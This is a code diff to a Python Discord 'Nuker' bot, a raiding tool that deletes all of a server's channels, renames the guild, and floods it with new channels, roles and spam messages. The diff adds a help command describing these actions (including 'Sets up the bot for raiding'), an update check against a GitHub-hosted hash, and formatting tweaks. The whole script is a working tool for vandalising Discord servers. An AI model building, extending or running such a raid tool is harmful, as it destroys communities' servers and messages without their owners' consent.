@@ -1,7 +1,24 @@
+import json
+import requests
+
+LOCAL_HASH = "929dd0c14648efcefae5e08822e21ad0"
+
+def check_for_update():
+    try:
+        response = requests.get("https://raw.githubusercontent.com/penotrator/nuker/main/lib/hash")
+        if response.status_code == 200:
+            remote_hash = response.text.strip()
+            return remote_hash == LOCAL_HASH
+        else:
+            print(f"{Fore.RED}[-]{Fore.RESET} Failed to check for update. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"{Fore.RED}[-]{Fore.RESET} Failed to check for update. Exception: {e}")
+
+    return False
+
 import discord
 import time
 import os
-import json
 from colorama import init, Fore
 from discord.ext import commands
 
@@ -15,6 +32,7 @@ def clear():
     else:
         os.system("clear")
 
+clear()
 
 # Defining main variables
 global thing
@@ -37,17 +55,38 @@ bot.remove_command("help")
 # Checking when the bot is ready
 @bot.event
 async def on_ready():
-    clear()
     os.system(f"title Nuker - {bot.user.name}")
     print(f"{Fore.GREEN}[+]{Fore.RESET} Logged in as {bot.user.name}\n")
 
 
 # Commands
-@bot.command()
+
+@bot.command(help="Shows this help message.")
+async def help(ctx):
+    await ctx.message.delete()
+    message = await generate_help_message(ctx)  # Pass ctx here
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+message)
+
+async def generate_help_message(ctx):  # Include ctx parameter here
+    commands_info = []
+    for command in bot.commands:
+        if command.help:
+            command_info = {
+                "name": command.name,
+                "description": command.help
+            }
+            commands_info.append(command_info)
+
+    message = f"Commands:\n\n"
+    for command in commands_info:
+        message += f"{command['name']} ━ {command['description']}\n"
+    return message
+
+@bot.command(help="Deletes all channels.")
 async def delete_channels(ctx):
     await ctx.message.delete()
-    print("______________________________\n")
-    print(f"\n{Fore.CYAN}[INFO]{Fore.RESET} Started removing channels\n")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+    print(f"{Fore.CYAN}[INFO]{Fore.RESET} Started removing channels\n")
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
@@ -60,10 +99,10 @@ async def delete_channels(ctx):
     print(f"{Fore.CYAN}[INFO]{Fore.RESET} Finished removing channels\n")
 
 
-@bot.command()
+@bot.command(help="Sets up the bot for raiding.")
 async def setup_bot(ctx):
     await ctx.message.delete()
-    print("______________________________\n")
+    print("━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
     global message
     global amount_of_nuker_messages_per_channel
     chan = input(f"{Fore.YELLOW}[!]{Fore.RESET} Channel name: ")
@@ -75,6 +114,9 @@ async def setup_bot(ctx):
     amount_of_channels = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of channels/roles: "))
     amount_of_nuker_messages_per_channel = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of messages per channel: "))
     delete_channels = input(f"{Fore.YELLOW}[!]{Fore.RESET} Delete channels? [y/n]: ")
+
+    print("\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+
     global thing
     thing = "True"
     await ctx.guild.edit(name=guildname)
@@ -89,7 +131,6 @@ async def setup_bot(ctx):
 
     for i in range(amount_of_channels):
         await ctx.guild.create_text_channel(chan)
-        print(f"{Fore.GREEN}[+]{Fore.RESET} Created channel | {chan} | {i + 1}")
         if make_roles == "y":
             await ctx.guild.create_role(name=rolename)
             print(f"{Fore.GREEN}[+]{Fore.RESET} Created role | {rolename}")
@@ -113,4 +154,9 @@ async def on_guild_channel_create(channel):
         pass
 
 
-bot.run(token)
+if __name__ == "__main__":
+    if check_for_update():
+        pass
+    else:
+        print(f"{Fore.YELLOW}[!]{Fore.RESET} There is a newer version of the bot available. Please update.\n")
+    bot.run(token)
